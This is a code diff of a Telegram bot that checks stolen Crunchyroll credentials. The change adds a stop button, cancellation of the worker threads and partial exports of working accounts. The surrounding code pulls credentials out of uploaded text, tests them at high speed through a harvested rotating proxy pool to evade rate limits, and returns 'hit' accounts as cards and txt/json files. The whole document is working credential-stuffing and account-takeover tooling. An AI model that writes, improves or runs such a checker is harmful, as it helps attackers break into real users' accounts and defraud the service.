@@ -209,8 +209,10 @@ MAX_PROXIES_TO_KEEP = 500  # 1:1 need many  # 24x7 keep more
 PROXY_TEST_TIMEOUT = 2  # 100x fast  # fast  # faster for 800-1000 cpm powerful • 24x7 auto proxy • Smart scoring
 PROXY_TEST_SAMPLE = 1000  # 100x fast - test more  # more
 CHECK_TIMEOUT = 10  # fast secure
-# Secure: per-user rate limit
+# Secure: per-user rate limit + stop flag
 USER_LAST_CHECK: dict = {}
+STOP_REQUEST: dict = {}  # uid -> True when user wants to stop current check
+ACTIVE_CHECK_MSG: dict = {}  # uid -> message id of progress note (for stop cleanup)
 USER_LOCK = threading.Lock()
 SECURE_LOG = True
 MAX_FILE_MB = 20  # Telegram Bot API download limit
@@ -1187,27 +1189,23 @@ def extract_credentials(text: str) -> List[dict]:
     return creds
 
 # ===================== CHECKER ENGINE =====================
-def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast & 1:1 — each account gets dedicated proxy
+def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> dict:  # 100x fast & 1:1 — each account gets dedicated proxy + stop support
     # 1:1 logic: ensure live proxies >= total accounts, if not, try to fetch more before starting
     try:
         creds_tmp = extract_credentials(text)
         need = len(creds_tmp)
         have = proxy_count()
         if need > have and need > 10:
-            # Need more proxies for 1:1 — try to harvest more quickly
             try:
-                # Force refresh to get more for 1:1
                 refresh_live_proxies(force=True)
             except Exception:
                 pass
-            # If still not enough, keep what we have and will cycle
             have2 = proxy_count()
             if have2 < need:
                 print(f"[*] 1:1 proxy: need {need}, have {have2}, will cycle")
     except Exception:
         pass
-    # Continue
-    """Thread-pool check of all credentials. Premium counters: hit/free/bad/rate/err/2fa + live feed + cpm."""
+    """Thread-pool check of all credentials. Premium counters: hit/free/bad/rate/err/2fa + live feed + cpm + stop flag."""
     ensure_proxies()
     creds = extract_credentials(text)
     results = {
@@ -1255,9 +1253,23 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
 
     t0 = time.time()
     results["t0"] = t0
+    results["stopped"] = False
     with ThreadPoolExecutor(max_workers=min(THREADS, max(50, proxy_count()*2))) as ex:  # smart scaling
         futures = {ex.submit(worker, c): c for c in creds}
         for fut in as_completed(futures):
+            # STOP CHECK support
+            if uid is not None:
+                try:
+                    if STOP_REQUEST.get(uid):
+                        results["stopped"] = True
+                        for f in list(futures.keys()):
+                            try:
+                                f.cancel()
+                            except Exception:
+                                pass
+                        break
+                except Exception:
+                    pass
             cred = futures[fut]
             try:
                 orig_cred, st, d = fut.result()
@@ -1265,7 +1277,6 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
                 orig_cred, st, d = cred, "err", dict(_blank_data(""), info=_clean_err(e))
             with lock:
                 results["processed"] += 1
-                # live feed: keep last 5 checked emails (for premium card)
                 try:
                     feed_val = orig_cred.get("value", "") if isinstance(orig_cred, dict) else str(orig_cred)
                     if orig_cred.get("type") == "email":
@@ -1280,7 +1291,6 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
                 if st == "hit":
                     entry = {"cred": orig_cred, "data": d, "st": "hit"}
                     results["hits"].append(entry)
-                    # Immediate hit delivery — don't wait for full scan
                     if hit_callback:
                         try:
                             hit_callback(entry)
@@ -1296,11 +1306,9 @@ def run_check(text: str, reporter=None, hit_callback=None) -> dict:  # 100x fast
                     results["twofa"] += 1
                 else:
                     results["err"] += 1
-                # update elapsed/cpm for progress
                 elapsed = time.time() - t0
                 results["elapsed"] = elapsed
                 results["cpm"] = _fmt_cpm(results["processed"], elapsed)
-                # throttled live update every 2 checks + interval in reporter
                 if reporter and results["processed"] % 2 == 0:
                     try:
                         reporter.update(results)
@@ -1679,14 +1687,15 @@ def progress_text(res: dict) -> str:
     return premium
 
 class ProgressReporter:
-    """Updates a Telegram message from worker threads without blocking."""
+    """Updates a Telegram message from worker threads without blocking + keeps stop button."""
 
-    def __init__(self, message, loop: asyncio.AbstractEventLoop, interval: float = 1.8):
+    def __init__(self, message, loop: asyncio.AbstractEventLoop, interval: float = 1.8, uid: int = None):
         self.message = message
         self.loop = loop
         self.interval = interval
         self.last = 0.0
         self.tasks: List = []
+        self.uid = uid
 
     def update(self, res: dict):
         now = time.time()
@@ -1701,8 +1710,19 @@ class ProgressReporter:
 
     async def _edit(self, text: str):
         try:
-            await self.message.edit_text(text, parse_mode=ParseMode.HTML)
-        except BadRequest:  # "message is not modified" etc. — safe to ignore
+            # Keep stop button while scanning
+            try:
+                kb = _build_kb([[("🛑 Stop Check", "stopcheck", "danger")]])
+                await self.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+            except BadRequest as e:
+                if "message is not modified" in str(e).lower():
+                    return
+                # fallback without kb
+                try:
+                    await self.message.edit_text(text, parse_mode=ParseMode.HTML)
+                except BadRequest:
+                    pass
+        except BadRequest:
             pass
         except Exception:
             pass
@@ -2213,13 +2233,15 @@ async def _run_and_report(msg, uid: int, text: str):
             await reply_menu(msg, "⏳ <b>Slow down</b> — wait 5 sec between checks.", [[("⬅️ Back", "menu", "danger")]])
             return
         if USER_LAST_CHECK.get(f"busy_{uid}"):
-            await reply_menu(msg, "⏳ <b>Busy</b> — one check at a time.", [[("⬅️ Back", "menu", "danger")]])
+            await reply_menu(msg, "⏳ <b>Busy</b> — one check at a time.\n\nUse 🛑 Stop Check to cancel.", [[("🛑 Stop Check", "stopcheck", "danger"), ("⬅️ Back", "menu", "danger")]])
             return
         USER_LAST_CHECK[f"busy_{uid}"] = True
         USER_LAST_CHECK[uid] = now
+        # clear previous stop request
+        STOP_REQUEST.pop(uid, None)
+        ACTIVE_CHECK_MSG.pop(uid, None)
     line_count = max(1, text.count("\n") + 1)
     creds_preview = len(extract_credentials(text))
-    # Premium initial card — mimics BlazeNXT "CRUNCHYROLL Scan — Live 0.6%"
     init_card = (
         f"╭────────────────────────╮\n"
         f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
@@ -2232,27 +2254,26 @@ async def _run_and_report(msg, uid: int, text: str):
         f"📈 <code>0 cpm</code>  🕒 <code>0m 0s</code>  ⏳ ETA <code>—</code>\n"
         f"📡 <b>Live feed:</b> • <i>starting…</i>"
     )
-    note = await msg.reply_text(init_card, parse_mode=ParseMode.HTML)
+    stop_kb = _build_kb([[("🛑 Stop Check", "stopcheck", "danger")]])
+    note = await msg.reply_text(init_card, parse_mode=ParseMode.HTML, reply_markup=stop_kb)
+    try:
+        ACTIVE_CHECK_MSG[uid] = note.message_id
+    except Exception:
+        pass
     loop = asyncio.get_running_loop()
-    reporter = ProgressReporter(note, loop)
-    # Immediate hit sender
+    reporter = ProgressReporter(note, loop, uid=uid)
     sent_hits = []
     def _hit_cb(entry):
         try:
             sent_hits.append(entry)
-            # Send hit card immediately without waiting
             fut = asyncio.run_coroutine_threadsafe(send_hit_cards(msg, [entry], cap=1), loop)
-            # Don't wait, just fire
         except Exception:
             pass
-
-    # Dual proxy: auto-fetch + manual pool both active
     try:
         ensure_proxies()
     except Exception:
         pass
     async def _proxy_watchdog():
-        # 24x7 smart watchdog — keeps proxies alive + unstuck progress
         last_processed = 0
         stuck_since = time.time()
         while True:
@@ -2265,7 +2286,6 @@ async def _run_and_report(msg, uid: int, text: str):
                     _load_pool_into_live()
                 if cnt == 0:
                     await asyncio.to_thread(refresh_live_proxies, True)
-                # Stuck detection: if processed hasn't moved for 90s, force refresh
                 try:
                     cur = results.get("processed", 0) if 'results' in locals() else 0
                     if cur == last_processed:
@@ -2283,15 +2303,22 @@ async def _run_and_report(msg, uid: int, text: str):
             try:
                 if note.text and "SCAN COMPLETE" in note.text:
                     break
+                if note.text and "STOPPED" in note.text:
+                    break
+                # if stop requested, break watchdog
+                if STOP_REQUEST.get(uid):
+                    break
             except Exception:
                 break
         return
     wd_task = asyncio.create_task(_proxy_watchdog())
     try:
-        results = await asyncio.to_thread(run_check, text, reporter, _hit_cb)
+        results = await asyncio.to_thread(run_check, text, reporter, _hit_cb, uid)
     except Exception as e:
         with USER_LOCK:
             USER_LAST_CHECK.pop(f"busy_{uid}", None)
+            STOP_REQUEST.pop(uid, None)
+            ACTIVE_CHECK_MSG.pop(uid, None)
         await note.edit_text(f"❌ <b>Check error</b>\n━━━━━━━━━━━━━━━━━━━━━\n<code>{esc(str(e)[:120])}</code>",
                              parse_mode=ParseMode.HTML)
         return
@@ -2300,9 +2327,46 @@ async def _run_and_report(msg, uid: int, text: str):
     except Exception:
         pass
     bump_checks(results["processed"])
-    await note.edit_text(summary_text(results), parse_mode=ParseMode.HTML)
+    # Handle stopped case
+    was_stopped = bool(results.get("stopped"))
+    if was_stopped:
+        try:
+            await note.edit_text(
+                f"🛑 <b>STOPPED</b> — Check cancelled by user\n"
+                f"━━━━━━━━━━━━━━━━━━━━━\n"
+                f"📊 Processed: <code>{results.get('processed',0)}/{results.get('total',0)}</code>\n"
+                f"✅ Hits: <code>{len(results.get('hits',[]))}</code> | 🆓 Free: <code>{len(results.get('free',[]))}</code>\n"
+                f"⏱ Time: <code>{results.get('seconds',0)}s</code> | 🌐 Live: <code>{proxy_count()}</code>",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception:
+            pass
+        # export whatever we have
+        premium_only = STORE.get_premium_only(uid)
+        to_send = results["hits"] if premium_only else results["hits"] + results["free"]
+        if to_send:
+            txt_path = make_export(to_send, "txt")
+            json_path = make_export(to_send, "json")
+            try:
+                with open(txt_path, "rb") as f:
+                    await msg.reply_document(document=InputFile(f, filename="accounts_stopped.txt"),
+                                             caption=f"💎 Partial Accounts: {len(to_send)} (stopped)")
+                with open(json_path, "rb") as f:
+                    await msg.reply_document(document=InputFile(f, filename="accounts_stopped.json"),
+                                             caption="📁 Partial JSON export")
+            finally:
+                Path(txt_path).unlink(missing_ok=True)
+                Path(json_path).unlink(missing_ok=True)
+        with USER_LOCK:
+            USER_LAST_CHECK.pop(f"busy_{uid}", None)
+            STOP_REQUEST.pop(uid, None)
+            ACTIVE_CHECK_MSG.pop(uid, None)
+        await reply_menu(msg, "🛑 <b>Check Stopped</b> — partial results above.",
+                         [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
+                          [("⬅️ Main Menu", "menu", "danger")]])
+        return
 
-    # exports (sent before the cards so the conversation stays readable)
+    await note.edit_text(summary_text(results), parse_mode=ParseMode.HTML)
     premium_only = STORE.get_premium_only(uid)
     to_send = results["hits"] if premium_only else results["hits"] + results["free"]
     if to_send:
@@ -2318,8 +2382,6 @@ async def _run_and_report(msg, uid: int, text: str):
         finally:
             Path(txt_path).unlink(missing_ok=True)
             Path(json_path).unlink(missing_ok=True)
-
-    # ⭐ one detail card per hit (flood-safe, capped)
     if results["hits"]:
         sent = await send_hit_cards(msg, results["hits"])
         extra = len(results["hits"]) - sent
@@ -2328,15 +2390,18 @@ async def _run_and_report(msg, uid: int, text: str):
                 [("⬅️ Main Menu", "menu", "danger")]]
         with USER_LOCK:
             USER_LAST_CHECK.pop(f"busy_{uid}", None)
+            STOP_REQUEST.pop(uid, None)
+            ACTIVE_CHECK_MSG.pop(uid, None)
         await reply_menu(msg, f"📬 <b>Hit cards sent:</b> {sent} {tail}", rows)
     else:
         with USER_LOCK:
             USER_LAST_CHECK.pop(f"busy_{uid}", None)
+            STOP_REQUEST.pop(uid, None)
+            ACTIVE_CHECK_MSG.pop(uid, None)
         await reply_menu(msg, "😕 No hits this time.",
                          [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
                           [("⬅️ Main Menu", "menu", "danger")]])
 
-# ===================== HANDLERS (100% button flow) =====================
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user = update.effective_user
@@ -2400,6 +2465,20 @@ async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
         txt = (msg.text or "").strip().lower()
         if txt in ("/cmds", "/commands", "/help"):
             await reply_menu(msg, help_text(), [[("⬅️ Back", "menu", "danger")]])
+            return
+        if txt in ("/stop", "/cancel", "/stopcheck"):
+            if not is_admin(user.id, getattr(user, "username", None)):
+                await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
+                return
+            busy = False
+            with USER_LOCK:
+                if USER_LAST_CHECK.get(f"busy_{user.id}"):
+                    busy = True
+                    STOP_REQUEST[user.id] = True
+            if busy:
+                await reply_menu(msg, "🛑 <b>Stopping...</b>\n<i>Current scan will stop in a moment</i>", [[("🛑 Stop Again", "stopcheck", "danger"), ("⬅️ Menu", "menu", "danger")]])
+            else:
+                await reply_menu(msg, "ℹ️ No active check running.", [[("⬅️ Back", "menu", "danger")]])
             return
         if txt in ("/proxy", "/proxies", "/proxyinfo", "/pool"):
             if not is_admin(user.id, getattr(user, "username", None)):
@@ -2814,6 +2893,35 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception:
             pass
 
+        if data == "stopcheck":
+            # Stop current check for this user
+            if not is_admin(uid, uname_btn):
+                try:
+                    await q.answer("❌ Admin only", show_alert=True)
+                except Exception:
+                    pass
+                return
+            busy = False
+            with USER_LOCK:
+                if USER_LAST_CHECK.get(f"busy_{uid}"):
+                    busy = True
+                    STOP_REQUEST[uid] = True
+            if busy:
+                try:
+                    await q.answer("🛑 Stopping check...", show_alert=False)
+                except Exception:
+                    pass
+                try:
+                    await m.edit_text("🛑 <b>Stopping...</b>\n<i>Cancelling current scan — please wait</i>", parse_mode=ParseMode.HTML)
+                except Exception:
+                    pass
+            else:
+                try:
+                    await q.answer("No active check", show_alert=False)
+                except Exception:
+                    pass
+                await edit_menu(m, "ℹ️ No active check running.", [[("⬅️ Back", "menu", "danger")]])
+            return
         if data == "menu":
             text, rows = menu_main(uid, uname_btn)
             await edit_menu(m, text, rows)
@@ -3068,6 +3176,9 @@ def main():
     app.add_handler(CommandHandler("threads", cmd_any))
     app.add_handler(CommandHandler("autoproxy", cmd_any))
     app.add_handler(CommandHandler("autoload", cmd_any))
+    app.add_handler(CommandHandler("stop", cmd_any))
+    app.add_handler(CommandHandler("cancel", cmd_any))
+    app.add_handler(CommandHandler("stopcheck", cmd_any))
     app.add_handler(MessageHandler(filters.COMMAND, cmd_any))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
